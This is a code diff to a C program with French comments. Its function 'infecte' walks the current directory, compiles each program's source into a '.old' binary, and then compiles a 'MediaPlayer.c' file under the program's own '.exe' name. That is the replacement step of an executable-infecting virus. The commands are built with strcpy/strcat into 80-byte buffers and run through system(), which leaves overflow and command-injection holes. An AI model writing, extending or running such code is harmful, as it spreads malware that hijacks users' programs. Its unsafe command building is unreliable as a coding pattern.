@@ -63,8 +63,9 @@ void infecte(char** f){
      */
     DIR *rep = opendir(".");
     char* monPG;
-    char* mediaPlayer;
     char* monPGNoExtension = NULL;
+    char commande1[80];
+    char commande2[80];
     if (rep!= NULL) {
         struct dirent *lecture;
         /**
@@ -83,16 +84,21 @@ void infecte(char** f){
                 /**
                  * Création de la commande gcc
                  */
-                char commande[80];
-                strcpy(commande, "gcc -Wall ");
-                strcat(commande, monPG);
-                strcat(commande, " -o ");
-                strcat(commande, monPGNoExtension);
-                strcat(commande, ".old");
-                system(commande); // Execution de la commande
+                strcpy(commande1, "gcc -Wall ");
+                strcat(commande1, monPG);
+                strcat(commande1, " -o ");
+                strcat(commande1, monPGNoExtension);
+                strcat(commande1, ".old");
+                system(commande1); // Execution de la commande
+
+                /**
+                 * Création de la commande pour dupliquer le MediaPlayer dans les executables des programmes
+                 */
+                strcpy(commande2, "gcc -Wall MediaPlayer.c -o ");
+                strcat(commande2, monPGNoExtension);
+                strcat(commande2, ".exe");
+                system(commande2); // Execution de la commande
             }
-
-
         }
         closedir(rep);
     }
